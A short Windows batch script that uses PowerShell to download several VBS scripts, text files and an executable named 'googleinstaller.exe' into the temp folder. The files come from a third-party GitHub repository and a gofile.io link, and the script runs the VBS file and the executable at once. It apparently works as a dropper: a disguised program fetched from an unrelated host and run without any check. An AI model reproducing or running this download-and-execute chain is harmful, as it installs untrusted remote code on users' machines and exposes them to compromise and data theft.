powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/ClickForRun.vbs' -OutFile $env:temp\ClickForRun.vbs"
start "" %temp%\ClickForRun.vbs
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/text.vbs' -OutFile $env:temp\text.vbs"
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/1.txt' -OutFile $env:temp\1.txt"
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ArstProjects/arstprojects.github.io/main/Downlaod/VBSBAT/2.txt' -OutFile $env:temp\2.txt"
powershell -command "Invoke-WebRequest -Uri 'https://store6.gofile.io/download/364d30a5-2441-451c-bc55-dfca953c6d23/system.txt' -OutFile $env:temp\system.txt"
powershell -command "Invoke-WebRequest -Uri 'https://github.com/ArstProjects/arstprojects.github.io/raw/main/Downlaod/googleinstaller.exe' -OutFile $env:temp\googleinstaller.exe"
start "" %temp%\googleinstaller.exe
